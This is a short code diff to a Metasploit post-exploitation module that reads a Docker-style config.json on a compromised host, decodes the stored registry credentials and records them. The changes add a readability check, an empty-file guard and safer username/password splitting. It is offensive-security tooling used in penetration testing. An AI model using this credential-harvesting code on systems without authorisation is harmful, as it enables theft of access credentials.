@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Post
       file = 'config.json'
       target = "#{path}/#{file}"
 
-      if file? target
+      if file?(target) && readable?(target)
         print_status("Downloading #{target} -> #{file}")
         extract(target)
       end
@@ -64,6 +64,8 @@ class MetasploitModule < Msf::Post
 
   def extract(target)
     file = read_file(target)
+    return if file.nil? || file.empty?
+
     parsed = JSON.parse(file)
     if parsed['auths']
       parsed['auths'].each do |key, value|
@@ -75,7 +77,7 @@ class MetasploitModule < Msf::Post
           next unless plain.include? ':'
 
           print_good("Found #{plain}")
-          username, password = plain.split(':')
+          username, password = plain.split(':', 2)
           credential_data = {
             origin_type: :import,
             module_fullname: fullname,
